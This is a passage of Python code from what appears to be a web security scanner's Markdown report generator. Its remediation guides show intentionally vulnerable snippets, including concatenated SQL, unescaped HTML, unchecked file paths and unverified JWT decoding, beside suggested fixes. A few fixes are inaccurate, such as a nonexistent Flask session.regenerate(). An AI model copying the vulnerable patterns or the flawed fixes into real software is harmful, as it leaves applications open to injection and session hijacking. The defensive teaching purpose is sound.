                f"| {emoji} {severity} | {count} | {percentage:.1f}% | {cvss_range} |"
            )
        md.append("")

        # Category Distribution
        if vulns_by_category:
            md.append("### Vulnerabilities by Category\n")
            md.append("| Category | Count | Top Severity |")
            md.append("|----------|-------|--------------|")
            sorted_categories = sorted(
                vulns_by_category.items(), key=lambda x: len(x[1]), reverse=True
            )
            for category, vulns in sorted_categories:
                top_severity = max(
                    [v.get("severity", "Info") for v in vulns],
                    key=lambda s: {
                        "Critical": 4,
                        "High": 3,
                        "Medium": 2,
                        "Low": 1,
                        "Info": 0,
                    }.get(s, 0),
                )
                emoji = self._get_severity_emoji(top_severity)
                md.append(f"| {category} | {len(vulns)} | {emoji} {top_severity} |")
            md.append("")

        md.append("\n---\n")

        # Attack Surface (if crawler was used)
        if self.crawler_results:
            md.append("## 🌐 Attack Surface Analysis\n")
            md.append(
                "The following attack surface was mapped during reconnaissance:\n"
            )
            md.append(
                f"- **Discovered URLs:** {self.crawler_results.get('total_urls', 0)}"
            )
            md.append(
                f"- **Forms Found:** {self.crawler_results.get('total_forms', 0)}"
            )
            md.append(
                f"- **Parameters Identified:** {self.crawler_results.get('total_parameters', 0)}"
            )
            md.append(
                f"- **Unique Endpoints:** {self.crawler_results.get('total_endpoints', 0)}"
            )
            md.append(
                f"- **JavaScript Files:** {len(self.crawler_results.get('js_files', []))}"
            )
            md.append(
                f"- **API Endpoints:** {len(self.crawler_results.get('api_endpoints', []))}\n"
            )

            # Top discovered endpoints
            if self.crawler_results.get("endpoints"):
                md.append("### Key Endpoints Discovered\n")
                for endpoint in list(self.crawler_results["endpoints"])[:15]:
                    md.append(f"- `{endpoint}`")
                md.append("")

            md.append("\n---\n")

        # Reconnaissance Results
        md.append("## 🔍 Reconnaissance Results\n")

        # DNS Information
        if "dns_info" in self.recon_results:
            dns = self.recon_results["dns_info"]
            md.append("### DNS Configuration\n")
            if dns.get("a_records"):
                md.append(f"**A Records:** {', '.join(dns['a_records'])}")
            if dns.get("mx_records"):
                md.append(f"**MX Records:** {', '.join(dns['mx_records'])}")
            if dns.get("ns_records"):
                md.append(f"**NS Records:** {', '.join(dns['ns_records'])}")
            md.append("")

        # Technology Stack
        if "tech_stack" in self.recon_results:
            tech = self.recon_results["tech_stack"]
            md.append("### Technology Stack\n")
            if tech.get("server"):
                md.append(f"**Web Server:** {tech['server']}")
            if tech.get("programming_language"):
                md.append(f"**Language/Framework:** {tech['programming_language']}")
            if tech.get("cms"):
                md.append(f"**CMS:** {tech['cms']}")
            if tech.get("frameworks"):
                md.append(f"**Frameworks:** {', '.join(tech['frameworks'])}")
            md.append("")

        # TLS/SSL Information
        if "tls_info" in self.recon_results:
            tls = self.recon_results["tls_info"]
            md.append("### TLS/SSL Configuration\n")
            if "tls_version" in tls:
                md.append(f"**TLS Version:** {tls['tls_version']}")
                if "cipher" in tls and tls["cipher"]:
                    cipher_name = (
                        tls["cipher"][0]
                        if isinstance(tls["cipher"], tuple)
                        else str(tls["cipher"])
                    )
                    md.append(f"**Cipher Suite:** {cipher_name}")
            elif "error" in tls:
                md.append(f"**Status:** ⚠️ {tls['error']}")
            md.append("")

        md.append("\n---\n")

        # Vulnerability Findings
        md.append("## 🚨 Detailed Security Vulnerabilities\n")

        if len(all_vulns) == 0:
            md.append("### ✅ No Vulnerabilities Detected\n")
            md.append(
                "The security scan did not identify any vulnerabilities in the tested scope. "
                "However, regular security assessments are recommended to maintain this security posture.\n"
            )
        else:
            md.append(
                "The following vulnerabilities were identified during the assessment. "
                "Each finding includes detailed technical analysis, proof of concept, and remediation guidance.\n"
            )

            # Group by severity
            for severity in ["Critical", "High", "Medium", "Low", "Info"]:
                severity_vulns = [v for v in all_vulns if v["severity"] == severity]

                if severity_vulns:
                    emoji = self._get_severity_emoji(severity)
                    md.append(
                        f"### {emoji} {severity} Severity Issues ({len(severity_vulns)})\n"
                    )

                    for i, vuln in enumerate(severity_vulns, 1):
                        cvss_score = self._calculate_cvss_score(vuln["severity"])
                        cwe_id = self._get_cwe_id(
                            vuln.get("category", ""), vuln.get("title", "")
                        )

                        md.append(f"#### {i}. {vuln['title']}\n")
                        md.append(
                            f"**Severity:** {vuln['severity']} | "
                            f"**CVSS Score:** {cvss_score}/10.0 | "
                            f"**CWE:** {cwe_id}"
                        )
                        md.append(f"**Category:** {vuln['category']}\n")

                        # Affected URLs
                        if vuln.get("affected_url"):
                            md.append("**Affected URLs:**")
                            if isinstance(vuln["affected_url"], list):
                                for url in vuln["affected_url"]:
                                    md.append(f"- `{url}`")
                            else:
                                md.append(f"- `{vuln['affected_url']}`")
                            md.append("")

                        # Description
                        md.append("**Description:**")
                        md.append(f"{vuln['description']}\n")

                        # Technical Details (ENHANCED)
                        md.append("**Technical Details:**")
                        md.append(self._generate_technical_details(vuln))
                        md.append("")

                        # Evidence / Proof of Concept (ENHANCED)
                        if vuln.get("evidence"):
                            md.append("**Evidence / Proof of Concept:**")
                            md.append(self._format_evidence(vuln["evidence"]))
                            md.append("")
                        else:
                            md.append("**Proof of Concept:**")
                            md.append(self._generate_poc(vuln))
                            md.append("")

                        # Impact Analysis (ENHANCED)
                        md.append("**Impact Analysis:**")
                        md.append(self._generate_impact_analysis(vuln))
                        md.append("")

                        # Detailed Remediation
                        md.append("**Remediation:**")
                        md.append(self._generate_detailed_remediation(vuln))
                        md.append("")

                        # References
                        md.append("**References:**")
                        owasp_ref = self._get_owasp_reference(vuln.get("category", ""))
                        cwe_url = self._get_cwe_url(cwe_id)
                        md.append(
                            f"- **OWASP:** [{vuln.get('category', 'General')}]({owasp_ref})"
                        )
                        md.append(f"- **CWE:** [{cwe_id}]({cwe_url})")
                        md.append(f"- **NIST:** [NVD Database](https://nvd.nist.gov/)")
                        md.append("")

                        md.append("---\n")
        # Recommendations
        md.append("## 💡 Strategic Recommendations\n")
        recommendations = self._generate_recommendations(severity_summary, all_vulns)
        for i, rec in enumerate(recommendations, 1):
            md.append(f"{i}. {rec}")
        md.append("")

        md.append("\n---\n")

        # Implementation Roadmap
        if len(all_vulns) > 0:
            md.append("## 🗓️ Remediation Roadmap\n")
            md.append("### Immediate Actions (0-7 days)")
            if severity_summary["Critical"] > 0:
                md.append(
                    f"- Address all {severity_summary['Critical']} Critical vulnerabilities"
                )
                md.append("- Implement emergency patches and security controls")
            if severity_summary["High"] > 0:
                md.append(
                    f"- Begin remediation of {severity_summary['High']} High severity issues"
                )
            md.append("")

            md.append("### Short-term Actions (1-4 weeks)")
            if severity_summary["Medium"] > 0:
                md.append(
                    f"- Resolve {severity_summary['Medium']} Medium severity vulnerabilities"
                )
            md.append("- Implement security headers and basic hardening")
            md.append("- Update vulnerable components and libraries")
            md.append("")

            md.append("### Long-term Actions (1-3 months)")
            if severity_summary["Low"] > 0:
                md.append(f"- Address {severity_summary['Low']} Low severity findings")
            md.append("- Establish regular security scanning schedule")
            md.append("- Implement security awareness training")
            md.append("- Deploy Web Application Firewall (WAF)")
            md.append("- Conduct penetration testing")
            md.append("")

        # Footer
        md.append("\n---\n")
        md.append("## 📋 Report Metadata\n")
        md.append(f"**Generated By:** Web Security Scanner v2.0")
        md.append(f"**Report ID:** {self.timestamp}")
        md.append(f"**Domain:** {self.domain_name}")
        md.append(
            f"**Generation Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        md.append(
            f"**Scan Coverage:** {'Comprehensive' if self.auth_results else 'Full' if self.crawler_results else 'Passive'}\n"
        )
        md.append("---\n")
        md.append(
            "*⚠️ This report contains sensitive security information. Handle with appropriate confidentiality.*"
        )
        md.append(
            "*For authorized security testing only. Unauthorized testing may violate applicable laws.*"
        )

        # Write to file
        filename = f"{self.domain_name}_security_report_{self.timestamp}.md"
        filepath = os.path.join("reports", "markdown", filename)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(md))

        return os.path.join("markdown", filename)

    def _generate_detailed_remediation(self, vuln):
        """Generate detailed remediation with code examples"""
        category = vuln.get("category", "")
        title = vuln.get("title", "").lower()

        remediation_guides = {
            "sql_injection": """
**Step-by-Step Fix:**

1. **Use Parameterized Queries (Prepared Statements):**
````````````````````python
# ❌ VULNERABLE CODE:
query = "SELECT * FROM users WHERE id = " + user_input
cursor.execute(query)

# ✅ SECURE CODE:
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_input,))
````````````````````

2. **Input Validation:**
````````````````````python
# Validate and sanitize input
import re
if not re.match(r'^[0-9]+$', user_input):
    raise ValueError("Invalid input")
````````````````````

3. **Use ORM Frameworks:**
````````````````````python
# Using SQLAlchemy ORM
user = session.query(User).filter(User.id == user_input).first()
```````````````````""",
            "xss": """
**Step-by-Step Fix:**

1. **Output Encoding:**
``````````````````python
# ❌ VULNERABLE CODE:
return f"<div>Hello {user_input}</div>"

# ✅ SECURE CODE:
from html import escape
return f"<div>Hello {escape(user_input)}</div>"
``````````````````

2. **Content Security Policy Header:**
``````````````````python
# Add to HTTP response headers
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
``````````````````

3. **Use Framework Auto-Escaping:**
``````````````````jinja2
{# Jinja2 auto-escapes by default #}
<div>Hello {{ user_input }}</div>
`````````````````""",
            "security_headers": """
**Step-by-Step Fix:**

1. **Add Security Headers:**
````````````````python
# Flask example
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
````````````````

2. **Nginx Configuration:**
````````````````nginx
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```````````````""",
            "cookie_security": """
**Step-by-Step Fix:**

1. **Secure Cookie Configuration:**
``````````````python
# ❌ VULNERABLE CODE:
response.set_cookie('session', session_id)

# ✅ SECURE CODE:
response.set_cookie(
    'session', 
    session_id,
    secure=True,      # Only over HTTPS
    httponly=True,    # No JavaScript access
    samesite='Strict' # CSRF protection
)
``````````````

2. **Framework Configuration:**
``````````````python
# Flask
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Strict'
)
`````````````""",
            "path_traversal": """
**Step-by-Step Fix:**

1. **Input Validation and Sanitization:**
````````````python
# ❌ VULNERABLE CODE:
file_path = f"/var/www/files/{user_input}"
with open(file_path) as f:
    return f.read()

# ✅ SECURE CODE:
import os
from pathlib import Path

base_dir = Path("/var/www/files")
requested_file = base_dir / user_input

# Resolve and check if still within base directory
resolved = requested_file.resolve()
if not resolved.is_relative_to(base_dir):
    raise ValueError("Invalid file path")

with open(resolved) as f:
    return f.read()
````````````

2. **Use Whitelist Approach:**
````````````python
ALLOWED_FILES = {'report.pdf', 'data.csv', 'image.png'}
if user_input not in ALLOWED_FILES:
    raise ValueError("File not allowed")
```````````""",
            "jwt_none_algorithm": """
**Step-by-Step Fix:**

1. **Reject 'none' Algorithm:**
``````````python
# ❌ VULNERABLE CODE:
import jwt
decoded = jwt.decode(token, verify=False)

# ✅ SECURE CODE:
import jwt

# Specify allowed algorithms explicitly
try:
    decoded = jwt.decode(
        token,
        secret_key,
        algorithms=['RS256', 'HS256']  # Never include 'none'
    )
except jwt.InvalidAlgorithmError:
    raise ValueError("Invalid token algorithm")
``````````

2. **Validate Algorithm in Token:**
``````````python
# Additional validation
header = jwt.get_unverified_header(token)
if header.get('alg', '').lower() == 'none':
    raise ValueError("Tokens with 'none' algorithm are not accepted")
`````````""",
            "jwt_sensitive_data": """
**Step-by-Step Fix:**

1. **Remove Sensitive Data from JWT:**
````````python
# ❌ VULNERABLE CODE:
payload = {
    'user_id': user.id,
    'username': user.username,
    'password': user.password,  # NEVER!
    'api_key': user.api_key      # NEVER!
}
token = jwt.encode(payload, secret_key)

# ✅ SECURE CODE:
payload = {
    'user_id': user.id,
    'username': user.username,
    'exp': datetime.utcnow() + timedelta(minutes=30)
}
token = jwt.encode(payload, secret_key, algorithm='RS256')
````````

2. **Use Encrypted Tokens for Sensitive Data:**
````````python
# Use JWE (JSON Web Encryption) for sensitive data
from jwcrypto import jwe, jwk

# Or use server-side sessions instead
session['user_data'] = sensitive_info
```````""",
            "session_fixation": """
**Step-by-Step Fix:**

1. **Regenerate Session ID After Authentication:**
``````python
# ❌ VULNERABLE CODE:
if authenticate(username, password):
    session['user_id'] = user.id
    return redirect('/dashboard')

# ✅ SECURE CODE:
if authenticate(username, password):
    # Regenerate session ID
    old_session = dict(session)
    session.clear()
    session.regenerate()  # or use framework's method
    session.update(old_session)
    session['user_id'] = user.id
    return redirect('/dashboard')
``````

2. **Flask/Django Examples:**
``````python
# Flask
from flask import session
session.regenerate()

# Django
request.session.flush()
request.session.create()
`````""",
            "auth_bypass": """
**Step-by-Step Fix:**

1. **Use Parameterized Queries:**
````python
# ❌ VULNERABLE CODE:
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = db.execute(query)

# ✅ SECURE CODE:
query = "SELECT * FROM users WHERE username=? AND password=?"
user = db.execute(query, (username, hashed_password))
````

2. **Implement Proper Password Hashing:**
````python
import bcrypt

# During registration
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

# During login
if bcrypt.checkpw(password.encode('utf-8'), stored_hash):
    # Authentication successful
    pass
````

3. **Rate Limiting:**
````python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic
    pass
```""",
        }

        # Determine which remediation guide to use
        if "sql" in title:
            return remediation_guides["sql_injection"]
        elif category == "XSS":
            return remediation_guides["xss"]
        elif category == "Security Headers":
            return remediation_guides["security_headers"]
        elif category == "Cookie Security":
            return remediation_guides["cookie_security"]
        elif "path traversal" in title:
            return remediation_guides["path_traversal"]
        elif "jwt" in title and "none" in title:
            return remediation_guides["jwt_none_algorithm"]
        elif "jwt" in title and "sensitive" in title:
            return remediation_guides["jwt_sensitive_data"]
        elif "session fixation" in title:
            return remediation_guides["session_fixation"]
        elif "authentication bypass" in title or "auth bypass" in title:
            return remediation_guides["auth_bypass"]
        else:
            return (
                f"{vuln.get('remediation', 'Follow security best practices to address this vulnerability.')}\n\n"
                "Consult OWASP guidelines and framework-specific security documentation for detailed implementation guidance."
            )

    def _calculate_risk_level(self, severity_summary):
        """Calculate overall risk level"""
        if severity_summary["Critical"] > 0:
            return "🔴 CRITICAL"
        elif severity_summary["High"] > 2:
            return "🟠 HIGH"
        elif severity_summary["High"] > 0 or severity_summary["Medium"] > 3:
            return "🟡 MEDIUM"
        elif severity_summary["Medium"] > 0 or severity_summary["Low"] > 0:
            return "🟢 LOW"
        else:
            return "✅ MINIMAL"

    def _get_severity_emoji(self, severity):
        """Get emoji for severity level"""
        emojis = {
            "Critical": "🔴",
            "High": "🟠",
            "Medium": "🟡",
            "Low": "🔵",
            "Info": "⚪",
        }
        return emojis.get(severity, "⚫")

    def _generate_recommendations(self, severity_summary, vulnerabilities):
        """Generate prioritized recommendations"""
        recommendations = []

        if severity_summary["Critical"] > 0:
            recommendations.append(
                "🔴 **CRITICAL PRIORITY:** Address all Critical vulnerabilities within 24-48 hours - these pose immediate security risks and are actively exploitable"
            )

        if severity_summary["High"] > 0:
            recommendations.append(
                "🟠 **HIGH PRIORITY:** Remediate High severity issues within 7 days - these represent significant security weaknesses"
            )

        if severity_summary["Medium"] > 0:
            recommendations.append(
                "🟡 **MEDIUM PRIORITY:** Resolve Medium severity vulnerabilities within 30 days as part of regular security maintenance"
            )

        # Check for specific vulnerability types
        vuln_types = set([v.get("category") for v in vulnerabilities])

        if "Injection" in vuln_types:
            recommendations.append(
                "💉 **Injection Prevention:** Implement parameterized queries, input validation, and output encoding across all user input points. Consider using ORM frameworks and prepared statements exclusively."
            )

        if "XSS" in vuln_types:
            recommendations.append(
                "🛡️ **XSS Mitigation:** Deploy Content Security Policy (CSP) headers, implement context-aware output encoding, and use framework-native auto-escaping features. Enable XSS protection in all modern browsers."
            )

        if "Security Headers" in vuln_types:
            recommendations.append(
                "📋 **Security Headers:** Configure all recommended HTTP security headers including CSP, HSTS, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy on the web server or application framework level."
            )

        if "Authentication" in vuln_types or "Session Management" in vuln_types:
            recommendations.append(
                "🔐 **Authentication Hardening:** Implement multi-factor authentication (MFA), secure session management, password policies, and account lockout mechanisms. Use industry-standard authentication protocols (OAuth 2.0, OpenID Connect)."
            )

        if "TLS/SSL" in vuln_types:
            recommendations.append(
                "🔒 **TLS/SSL Upgrade:** Disable TLS 1.0 and 1.1, implement TLS 1.2 or 1.3, configure strong cipher suites (AES-GCM, ChaCha20), and enable HSTS. Use tools like SSL Labs for validation."
            )

        if "CORS" in vuln_types:
            recommendations.append(
                "🌐 **CORS Configuration:** Implement strict origin whitelisting, avoid wildcard origins in production, and never use 'Access-Control-Allow-Credentials: true' with wildcard origins."
            )

        # General recommendations
        recommendations.extend(
            [
                "📚 **Security Training:** Conduct OWASP Top 10 awareness training for all developers and implement secure coding guidelines in the SDLC",
                "🔄 **Regular Scanning:** Establish automated security scanning in CI/CD pipelines and conduct quarterly penetration tests",
                "📊 **Monitoring:** Implement Web Application Firewall (WAF), security information and event management (SIEM), and real-time threat detection",
                "🛠️ **Patch Management:** Maintain up-to-date software dependencies, apply security patches promptly, and monitor vulnerability databases (CVE, NVD)",
                "✅ **Compliance:** Ensure alignment with relevant frameworks (PCI-DSS, GDPR, HIPAA, SOC 2) and conduct regular security audits",
            ]
        )

        return recommendations
